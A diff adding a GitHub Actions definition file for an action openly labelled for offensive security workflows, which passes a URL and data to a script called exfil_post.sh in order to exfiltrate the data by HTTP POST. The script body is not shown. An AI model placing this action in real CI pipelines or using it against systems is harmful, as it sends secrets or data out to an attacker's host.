@@ -1,0 +1,18 @@
+name: '"Exfil with HTTP POST" Action for Offensive Security Workflows'
+description: 'Takes some input data and tries to use available tools to exfiltrate the data using an HTTP POST request'
+author: nopcorn
+
+inputs:
+  url:
+    description: 'The url to POST the payload to'
+    required: true
+  data:
+    description: 'The data to POST to inputs.url'
+    required: true
+
+runs:
+  using: 'composite'
+  steps:
+    - name: exfil
+      shell: bash
+      run: ./exfil_post.sh "${{ inputs.url }}" "${{ inputs.data }}"
